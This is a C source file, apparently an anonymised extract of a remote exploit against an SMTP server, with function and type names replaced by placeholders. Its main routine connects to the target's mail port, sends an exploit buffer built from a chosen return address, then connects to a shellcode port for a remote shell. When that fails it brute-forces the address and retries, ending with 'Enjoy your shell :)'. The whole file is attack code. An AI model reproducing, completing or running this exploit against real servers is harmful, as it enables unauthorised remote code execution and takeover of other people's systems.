#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
struct TYPE_4__ {int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_addr; } ;
struct TYPE_6__ {size_t target; int offset; int wait; TYPE_1__ host; } ;
struct TYPE_5__ {int retaddr; char* name; } ;

/* Variables and functions */
 int SC_PORT ; 
 int /*<<< orphan*/  FUNC0 () ; 
 int brutemode ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 char* FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int FUNC8 (int /*<<< orphan*/ ) ; 
 TYPE_3__ options ; 
 int /*<<< orphan*/  FUNC9 (int,char**) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  sc ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC13 (int /*<<< orphan*/ ) ; 
 TYPE_2__* targets ; 

int FUNC14(int argc, char **argv)
{
  int address, sock_smtp, sock_shell;

  FUNC0();
  FUNC9(argc, argv);
  address = targets[options.target].retaddr - options.offset;
  brutemode = 0;

 bruteforce:

  if (!brutemode)
    {
      FUNC10("[*] Connecting to %s:%d... ",
	     FUNC6(options.host.sin_addr), FUNC8(options.host.sin_port));
      FUNC5(stdout);
    }

  sock_smtp = FUNC2(FUNC8(options.host.sin_port));

  if (!brutemode)
    {
      if (!sock_smtp) 
	{
	  FUNC10("failed.\n\n");
	  FUNC3(-1);
	}
      FUNC10("success.\n");
    }

  FUNC7(sock_smtp);
  FUNC4(sock_smtp, address);
  FUNC1(sock_smtp);

  FUNC10("[*] Target: %s - 0x%.8x\n", targets[options.target].name, address);
  FUNC10("[*] Exploit sent, spawning a shell... ");
  FUNC5(stdout);

  FUNC12(1); // patience grasshopper
  sock_shell = FUNC2(SC_PORT);

  if (!sock_shell && options.target)
    {
      FUNC10("failed.\n\n");
      FUNC3(-1);
    }
  if (!sock_shell)
    {
      FUNC10("failed.\n\n");
      address -= 1000 - FUNC13(sc);
      brutemode = 1;
      if (options.wait) FUNC12(options.wait);
      goto bruteforce;
    }
  FUNC10("success!\n\nEnjoy your shell :)\n\n");
  FUNC11(sock_shell);

  return 0;
}